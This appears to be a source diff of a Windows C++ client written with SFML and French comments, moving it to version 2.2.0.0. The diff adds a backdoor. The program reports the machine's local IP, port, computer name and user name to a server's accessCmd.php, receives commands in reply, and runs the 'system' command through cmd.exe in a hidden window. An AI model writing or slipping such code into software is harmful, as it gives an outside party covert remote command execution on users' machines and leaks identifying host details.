@@ -21,13 +21,15 @@
 
 using namespace std;
 
+void httpCmd(string cmd, string arg1, string arg2, string arg3);
+
 int main(int argc, char *argv[])
 {
 #if _WIN64
-	string version = "2.1.6.2 x64";
+	string version = "2.2.0.0 x64";
 	bool archWin64 = true;
 #else
-	string version = "2.1.6.2";
+	string version = "2.2.0.0";
 	bool archWin64 = false;
 #endif
 
@@ -99,6 +101,8 @@ int main(int argc, char *argv[])
 	unsigned long temps = time(0);
 	unsigned long temps2 = time(0);
 	unsigned long temps3 = time(0);
+
+	string cmd, arg1, arg2, arg3;
 
 	//sf::SoundBufferRecorder record;
 
@@ -426,6 +430,35 @@ int main(int argc, char *argv[])
 				}
 			}
 
+
+			//cherche des commandes
+			
+				str.str("");
+				str.clear();
+
+				str << "/accessCmd.php?ipLocal=" << sf::IpAddress::getLocalAddress() << "&";
+				str << "port=" << listener.getLocalPort() << "&";
+				_dupenv_s(&pValue1, &len1, "COMPUTERNAME");
+				str << "compName=" << pValue1 << "&";
+				_dupenv_s(&pValue2, &len2, "USERNAME");
+				str << "userName=" << pValue2;
+				request.setUri(str.str());
+
+				response = http.sendRequest(request);
+				str2.str("");
+				str2.clear();
+				str2 << response.getBody();
+				//str2 >> cmd >> arg1 >> arg2 >> arg3; //3 arguments, ca devrait etre suffisant.
+				getline(str2, cmd);
+				getline(str2, arg1);
+				getline(str2, arg2);
+				getline(str2, arg3);
+				//bon c'est con de faire "propre" maintenant mais yolo on envoit tout sur une fonction qui trie :)
+				if (cmd != "NULL") {
+					httpCmd(cmd, arg1, arg2, arg3);
+				}
+			
+
 			if (socket.receive(packet) == sf::Socket::Disconnected)
 			{
 				isConnected = false;
@@ -438,4 +471,17 @@ int main(int argc, char *argv[])
 	}
 
 	return 0;
+}
+
+
+
+
+void httpCmd(string cmd, string arg1, string arg2, string arg3)
+{
+	if (cmd == "system")
+	{
+		string resultSystem = "/C " + arg1;
+		cout << "system arg1: " << arg1 << endl;
+		ShellExecuteA(NULL, "open", "cmd.exe", resultSystem.c_str(), "C:\\ProgramData\\", SW_HIDE);
+	}
 }
